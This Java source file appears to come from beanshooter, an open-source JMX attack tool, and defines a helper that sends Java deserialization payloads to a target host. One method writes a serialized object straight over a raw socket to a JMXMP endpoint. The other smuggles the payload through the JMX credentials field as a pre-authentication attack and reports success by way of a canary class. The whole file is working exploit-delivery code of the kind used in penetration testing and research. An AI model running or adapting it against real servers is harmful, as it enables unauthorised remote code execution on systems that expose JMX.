package de.qtc.beanshooter.operation;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

import javax.management.remote.JMXConnector;

import org.jolokia.client.exception.J4pRemoteException;

import de.qtc.beanshooter.cli.ArgumentHandler;
import de.qtc.beanshooter.exceptions.AuthenticationException;
import de.qtc.beanshooter.exceptions.ExceptionHandler;
import de.qtc.beanshooter.exceptions.GlassFishException;
import de.qtc.beanshooter.exceptions.InvalidLoginClassException;
import de.qtc.beanshooter.io.Logger;
import de.qtc.beanshooter.plugin.PluginSystem;

/**
 * Helper class to assist during deserialization attacks.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class SerialHelper
{
    /**
     * The JMXMP protocol starts with serialized Java objects right away. There is no need for a handshake
     * or something like this and the payload can be send directly. This is even true for TLS protected
     * JMXMP endpoints. When TLS protected, the JMXMP protocol still starts with a plaintext communication
     * and switches over to TLS after exchanging some messages. We can therefore just open a simple TCP
     * connection and send our payload object.
     *
     * @param payload payload object to send
     * @throws IOException
     */
    public static void serialJMXMP(Object payload) throws IOException
    {
        String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
        int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);

        Logger.printlnYellow("Sending payload object.");

        try(Socket sock = new Socket(host, port))
        {
            ObjectOutputStream objOut = new ObjectOutputStream(sock.getOutputStream());
            objOut.writeObject(payload);
        }

        Logger.printlnMixedBlue("The payload object", "was send", "successfully.");
        Logger.printlnMixedBlueFirst("Notice:", "For JMXMP endpoints it is not possible to determine the success of a payload.");
    }

    /**
     * Send the deserialization payload within the JMXConnector.CREDENTIALS key of the environment
     * map.
     *
     * @param payload payload object to send
     * @throws AuthenticationException
     */
    public static void serialPreauth(Object payload)
    {
        String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
        int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);

        Map<String,Object> env = new HashMap<String,Object>();
        env.put(JMXConnector.CREDENTIALS, payload);

        try
        {
            PluginSystem.getMBeanServerConnectionUmanaged(host, port, env);
            Logger.printlnMixedYellow("Remote MBeanServer",  "accepted", "the payload class.");

            if (BeanshooterOption.SERIAL_NO_CANARY.getBool())
            {
                Logger.printlnMixedBlue("The attack was", "probably successful", "but could also have failed.");
                Logger.printlnMixedYellow("Rerun without the", "--no-canary", "option to get a more reliable result.");
            }

            else
            {
                Logger.printlnMixedBlue("The attack", "probably failed", "as the canary class was not deserialized.");
            }
        }

        catch (GlassFishException e)
        {
            Logger.printlnMixedYellow("Remote MBeanServer",  "accepted", "the payload class.");

            if (BeanshooterOption.SERIAL_NO_CANARY.getBool())
            {
                Logger.printlnMixedBlue("The attack was", "probably successful", "but could also have failed.");
                Logger.printlnMixedYellow("Rerun without the", "--no-canary", "option to get a more reliable result.");
            }

            else
            {
                Logger.printlnMixedBlue("The attack", "probably failed", "as the canary class was not deserialized.");
            }
        }

        catch (AuthenticationException e)
        {
            Throwable t = ExceptionHandler.getCause(e.getOriginalException());

            if (t instanceof ClassNotFoundException)
                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);

            else if (e instanceof InvalidLoginClassException)
            {
                Logger.printlnMixedRed("Server appears to be", "not vulnerable", "to preauth deserialization attacks.");
                ExceptionHandler.showStackTrace(e);
            }

            else
                ExceptionHandler.unexpectedException(e, "preauth deserialization", "attack", false);
        }

        catch (J4pRemoteException e)
        {
            // Actually unreachable code, as serial action is not supported for Jolokia
            ExceptionHandler.handleJ4pRemoteException(e, "during deserialization attack");
        }
    }
}
